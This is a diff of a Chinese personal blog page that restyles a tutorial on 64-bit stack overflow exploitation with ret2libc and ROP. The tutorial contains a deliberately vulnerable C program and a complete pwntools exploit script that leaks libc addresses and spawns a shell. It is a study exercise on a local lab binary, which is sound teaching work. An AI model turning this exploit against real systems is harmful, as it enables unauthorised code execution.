@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="栈溢出 ret2libc rop">
-    <meta name="description" content="Go go">
+    <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>高级栈溢出及ret2libc | Xsyin</title>
+    <title>高级栈溢出及ret2libc | Xsyin&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -29,7 +29,8 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 
@@ -43,7 +44,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Xsyin</span>
+                    <span class="logo-span">Xsyin&#39;s blog</span>
                 </a>
             </div>
             
@@ -117,17 +118,6 @@
     
   </li>
   
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
   <li>
     <a href="#searchModal" class="modal-trigger waves-effect waves-light">
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
@@ -142,10 +132,10 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Xsyin</div>
+        <div class="logo-name">Xsyin&#39;s blog</div>
         <div class="logo-desc">
             
-            Go go
+            本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。
             
         </div>
     </div>
@@ -220,21 +210,10 @@
           
         </li>
         
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/Xsyin/Xsyin.github.io" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -291,7 +270,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/Xsyin/Xsyin.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -465,6 +444,11 @@
                 
 
                 
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2018-05-05
+                </div>
+                
 
                 
 
@@ -488,13 +472,14 @@
 <ul>
 <li>gdb-peda</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit </span><br></pre></td></tr></table></figure>
-
+<pre><code>$ git clone https://github.com/longld/peda.git ~/peda
+$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 
+</code></pre>
 <ul>
 <li>pwntools</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install pwn</span><br></pre></td></tr></table></figure>
-
+<pre><code>$ pip install pwn
+</code></pre>
 <span id="more"></span>
 
 <h3 id="三种保护机制"><a href="#三种保护机制" class="headerlink" title="三种保护机制"></a>三种保护机制</h3><ul>
@@ -515,8 +500,36 @@
 <li>由于操作环境为64位<code>linux</code> ，函数通过<code>rdi,rsi,rdx,rcx,r8,r9</code> 以及栈传参，因此采用<code>pop,ret</code> 片段装填参数</li>
 </ol>
 <p>​    本次实验结合了<code>ret2libc</code> 与<code>ROP</code> 两种手段，为简化操作，内置了需要的<code>gadget</code> 。</p>
-<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: vuln.c</span></span><br><span class="line"><span class="comment">    &gt; Author: xsyin</span></span><br><span class="line"><span class="comment">    &gt; Mail: shouyinXu@163.com </span></span><br><span class="line"><span class="comment">    &gt; Created Time: 2018年05月05日 星期六 14时24分14秒</span></span><br><span class="line"><span class="comment">    &gt; Make: gcc -fno-stack-protector -g vuln.c -o vuln</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">helper</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">&quot;pop %rdi; pop %rsi; pop %rdx; ret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">128</span>);</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">&quot;Enter input: \n&quot;</span>,<span class="number">14</span>);</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*************************************************************************
+    > File Name: vuln.c
+    > Author: xsyin
+    > Mail: shouyinXu@163.com 
+    > Created Time: 2018年05月05日 星期六 14时24分14秒
+    > Make: gcc -fno-stack-protector -g vuln.c -o vuln
+ ************************************************************************/</span>
 
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pop %rdi; pop %rsi; pop %rdx; ret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Enter input: \n"</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>read</code> 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。</p>
 <ul>
 <li>寻找溢出点</li>
@@ -531,11 +544,22 @@
 <ul>
 <li>构造<code>payload</code> ：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#payload1 获取write函数实际地址</span><br><span class="line">payload1 = &quot;A&quot; * 136  #截至返回地址前的缓冲区长度</span><br><span class="line">payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值</span><br><span class="line">payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdout</span><br><span class="line">payload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址</span><br><span class="line">payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度</span><br><span class="line">payload1 += p64(plt_write) #调用write函数</span><br><span class="line">payload1 += p64(vuln)      #继续调用vuln函数</span><br></pre></td></tr></table></figure>
-
+<pre><code>#payload1 获取write函数实际地址
+payload1 = &quot;A&quot; * 136  #截至返回地址前的缓冲区长度
+payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值
+payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdout
+payload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址
+payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度
+payload1 += p64(plt_write) #调用write函数
+payload1 += p64(vuln)      #继续调用vuln函数
+</code></pre>
 <p>由于<code>linux</code> 共享库的延迟绑定技术，函数第一次调用时填充<code>GOT</code>表，在运行到<code>read</code> 函数时<code>write</code> 函数<code>GOT</code> 表中已填入实际地址。<code>payload1</code> 读取该地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#payload2 跳转至库函数system</span><br><span class="line">payload2 = &quot;A&quot; * 136   #截至返回地址前的缓冲区长度</span><br><span class="line">payload2 += p64(pr)   #跳转到PR指令序列，填充system的第一个参数</span><br><span class="line">payload2 += p64(binsh_addr)  #system函数的第一个参数/bin/sh</span><br><span class="line">payload2 += p64(systemAddr)    #调用system函数</span><br></pre></td></tr></table></figure>
-
+<pre><code>#payload2 跳转至库函数system
+payload2 = &quot;A&quot; * 136   #截至返回地址前的缓冲区长度
+payload2 += p64(pr)   #跳转到PR指令序列，填充system的第一个参数
+payload2 += p64(binsh_addr)  #system函数的第一个参数/bin/sh
+payload2 += p64(systemAddr)    #调用system函数
+</code></pre>
 <h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/%E9%80%89%E5%8C%BA_068.png" alt="选区_068"></p>
 <p>退出报错，可以通过PPPR片段再次跳转到<code>exit</code> 函数正常退出。</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <strong>优点：</strong>  通过<code>ret2libc</code> 与 <code>ROP</code> 绕过了ASLR与NX机制</p>
@@ -548,10 +572,64 @@
 <li><p>需要知道 <code>libc</code> 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索</p>
 </li>
 </ol>
-<h3 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># file: exploit.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pppr = <span class="number">0x4005ba</span></span><br><span class="line">pr = <span class="number">0x400693</span></span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_system: &quot;</span>+<span class="built_in">hex</span>(libc_system)</span><br><span class="line"></span><br><span class="line">vuln = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span> * <span class="number">136</span></span><br><span class="line">payload1 += p64(pppr)</span><br><span class="line">payload1 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload1 += p64(got_write)</span><br><span class="line">payload1 += p64(<span class="number">0x8</span>)</span><br><span class="line">payload1 += p64(plt_write)</span><br><span class="line">payload1 += p64(vuln)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter input:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;################ send payload1 ###########&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">writeAddrTmp = struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, p.recv(<span class="number">8</span>)[-<span class="number">8</span>::])</span><br><span class="line">writeAddr = writeAddrTmp[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;writeAddr:&quot;</span>, <span class="built_in">hex</span>(writeAddr)</span><br><span class="line"></span><br><span class="line">systemAddr = (writeAddr - libc_write) + libc_system</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;systemAddr:&quot;</span>, <span class="built_in">hex</span>(systemAddr)</span><br><span class="line"></span><br><span class="line">binsh_addr = (writeAddr - libc_write) + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>, <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;A&quot;</span> * <span class="number">136</span></span><br><span class="line">payload2 += p64(pr)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(systemAddr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter input:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;################ send payload2 ###########&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># file: exploit.py</span>
 
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> struct
 
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'vuln'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
 
+pppr <span class="token operator">=</span> <span class="token number">0x4005ba</span>
+pr <span class="token operator">=</span> <span class="token number">0x400693</span>
+
+plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+
+libc_write <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+libc_system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">"libc_system: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_system<span class="token punctuation">)</span>
+
+vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>
+
+payload1 <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">136</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Enter input:"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"################ send payload1 ###########"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+
+writeAddrTmp <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+writeAddr <span class="token operator">=</span> writeAddrTmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">"writeAddr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>writeAddr<span class="token punctuation">)</span>
+
+systemAddr <span class="token operator">=</span> <span class="token punctuation">(</span>writeAddr <span class="token operator">-</span> libc_write<span class="token punctuation">)</span> <span class="token operator">+</span> libc_system
+<span class="token keyword">print</span> <span class="token string">"systemAddr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>systemAddr<span class="token punctuation">)</span>
+
+binsh_addr <span class="token operator">=</span> <span class="token punctuation">(</span>writeAddr <span class="token operator">-</span> libc_write<span class="token punctuation">)</span> <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"binsh_addr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">136</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pr<span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>systemAddr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Enter input:"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"################ send payload2 ###########"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://jaq.alibaba.com/community/art/show?articleid=473">一步一步学ROP之linux_x64篇</a></p>
 
                 
@@ -569,7 +647,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Xu Shouyin</a>
+                    <a href="https://Xsyin.github.io" rel="external nofollow noreferrer">Xu Shouyin</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -577,7 +655,7 @@
                     <i class="fas fa-link">
                         文章链接:
                     </i>
-                </span>
+                    </span>
                 <span class="reprint-info">
                     <a href="https://Xsyin.github.io/2018/05/05/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/">https://Xsyin.github.io/2018/05/05/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/</a>
                 </span>
@@ -590,9 +668,9 @@
                 </span>
                 <span class="reprint-info">
                     本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-ND 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Xu Shouyin</a>
+                    <a href="https://Xsyin.github.io" target="_blank">Xu Shouyin</a>
                     !
                 </span>
             </div>
@@ -633,7 +711,7 @@
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -911,6 +989,43 @@ Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_
 </div>
 
 
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Xsyin&#39;s blog<br />'
+            + '文章作者: Xu Shouyin<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
@@ -1033,67 +1148,13 @@ Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
